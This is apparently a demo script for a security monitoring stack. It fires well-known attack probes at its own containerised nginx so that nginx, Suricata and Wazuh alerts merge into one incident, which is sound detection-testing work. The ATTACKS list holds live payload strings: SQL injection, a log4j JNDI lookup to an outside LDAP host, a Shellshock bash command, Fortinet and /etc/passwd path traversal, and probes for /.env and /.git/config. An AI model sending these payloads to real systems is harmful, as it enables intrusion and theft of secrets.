#!/usr/bin/env python3
"""One attacker seen by nginx, Suricata and Wazuh, in one Wolf incident (the "ids" profile).

After `docker compose --profile ids up -d` in dev/demo:  python3 dev/demo/ids_scenario.py
Stdlib only. The attacks are sent from inside the stack (the catcher container) to nginx's port
8081, which is not published: there, as behind a load balancer, X-Forwarded-For names the client
(nginx.conf), and Suricata reads it too, so the three detectors name one public address.
"""

import json
import os
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime, timezone

from scenario import URL, WEBHOOK, api, step

ATTACKER = "45.33.32.156"  # scanme.nmap.org, the address Nmap's project lets anyone scan; only named here
RULES = ["Network IDS alert (critical)", "Host intrusion alert (critical)"]
SOURCES = {"nginx": "the bench's own nginx log", "suricata": "Suricata", "wazuh": "Wazuh"}
ATTACKS = [
	("sqlmap: SQL injection in the URL", "/api/method/frappe.client.get_list?doctype=User&filters=1%27%20UNION%20ALL%20SELECT%20NULL,NULL--",
	 {"User-Agent": "sqlmap/1.8.2#stable (https://sqlmap.org)"}),
	("log4j in the User-Agent", "/", {"User-Agent": "${jndi:ldap://45.33.32.156:1389/a}"}),
	("Shellshock", "/cgi-bin/status", {"User-Agent": '() { :; }; /bin/bash -c "id"'}),
	("Fortinet SSL VPN path traversal", "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession", {}),
	("secrets: /.env", "/.env", {}),
	("secrets: /.git/config", "/.git/config", {}),
	("path traversal", "/index.php?page=../../../../etc/passwd", {}),
]


HERE = os.path.dirname(os.path.abspath(__file__))
# run in the catcher container: the attacker is on the demo network, where port 8081 listens
ATTACK = """
import json, sys, urllib.error, urllib.request
for label, path, headers in json.load(sys.stdin):
	req = urllib.request.Request("http://frontend:8081" + path, headers=headers)
	try:
		with urllib.request.urlopen(req, timeout=10) as r:
			status = r.status
	except urllib.error.HTTPError as e:
		status = e.code
	except OSError as e:
		status = type(e).__name__
	print(f"    {status!s:>4}  {label}", flush=True)
"""


def compose(*args, capture=False, stdin=None):
	# stdout only: docker's own errors still reach the terminal
	return subprocess.run(["docker", "compose", "--profile", "ids", *args], check=True, text=True, cwd=HERE,
	                      input=stdin, stdout=subprocess.PIPE if capture else None).stdout  # fmt: skip


def logs(service, since):
	"""The service's log lines from `since` on: earlier runs and restarts do not count."""
	return compose("logs", "--no-log-prefix", "--since", since, service, capture=True)


def running(service):
	return service in compose("ps", "--status", "running", "--services", capture=True).split()


def now():
	return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def wait(what, ready, seconds):
	end = time.time() + seconds
	while time.time() < end:
		if ready():
			return True
		time.sleep(5)
	sys.exit(f"gave up waiting for {what} after {seconds}s: see `docker compose --profile ids logs`")


def events():
	return api("GET", "/api/resource/Wolf Event?" + urllib.parse.urlencode({
		"fields": json.dumps(["name", "source", "category", "severity", "title", "incident", "host"]),
		"filters": json.dumps([["payload", "like", f'%"{ATTACKER}"%']]),
		"order_by": "creation asc", "limit_page_length": 200,
	}, quote_via=urllib.parse.quote))["data"]


def main():
	step("Suricata has loaded ET Open and listens")
	# since the container started: a first start downloads ET Open before the engine starts
	started = compose("ps", "--format", "{{.CreatedAt}}", "suricata", capture=True).strip()
	since = datetime.strptime(started[:19], "%Y-%m-%d %H:%M:%S").strftime("%Y-%m-%dT%H:%M:%S") if started else now()
	wait("Suricata", lambda: running("suricata") and "Engine started" in logs("suricata", since), 600)
	# the agents re-check for these logs every 5 minutes; a restart reads them now
	since = now()
	compose("restart", "agent")
	wait("the agent to read eve.json", lambda: "Suricata EVE log: /var/log/suricata/eve.json" in logs("agent", since), 180)
	step("Wazuh writes alerts.json; the Wolf agent on its host reads it")
	wait("Wazuh's first alert", lambda: subprocess.run(
		["docker", "compose", "--profile", "ids", "exec", "-T", "wazuh-manager", "test", "-s", "/var/ossec/logs/alerts/alerts.json"],
		cwd=HERE, capture_output=True).returncode == 0, 600)  # fmt: skip
	since = now()
	compose("restart", "wazuh-wolf-agent")
	wait("the agent to read alerts.json", lambda: "Wazuh alerts log" in logs("wazuh-wolf-agent", since), 180)

	step("Log in as Administrator; the IDS and HIDS presets alert the webhook sink")
	api("POST", "/api/method/login", {"usr": "Administrator", "pwd": "admin"})
	for rule in RULES:
		api("PUT", "/api/resource/Wolf Alert Rule/" + rule,
		    {"enabled": 1, "channels": [{"channel_type": "Webhook", "webhook_url": WEBHOOK, "enabled": 1}]})
		print("   ", rule)

	step(f"Attacks from {ATTACKER}")
	attacks = [(label, path, {"X-Forwarded-For": ATTACKER, **headers}) for label, path, headers in ATTACKS]
	print(compose("exec", "-T", "catcher", "python3", "-c", ATTACK, capture=True, stdin=json.dumps(attacks)), end="")

	step("Wait for the three detectors and the incident (up to 5 minutes)")
	seen = {}

	def ready():
		seen.clear()
		for e in events():
			seen.setdefault(e["source"], []).append(e)
		return set(SOURCES) <= set(seen) and any(e["incident"] for e in seen["suricata"])
	wait("events from nginx, Suricata and Wazuh", ready, 300)

	for source, label in SOURCES.items():
		print(f"    {label}:")
		for e in seen[source]:
			print(f"      {e['severity']:<8} {e['category']:<18} {e['incident'] or '-':<12} {e['title'][:70]}")
	incidents = sorted({e["incident"] for rows in seen.values() for e in rows if e["incident"]})
	print(f"\nIncident{'s' if len(incidents) > 1 else ''}: {', '.join(incidents)}")
	print(f"Open {URL}/wolf/incidents/{incidents[0]} (Administrator / admin): one attacker, three detectors.")
	print("Webhook payloads: docker compose logs catcher")


if __name__ == "__main__":
	main()
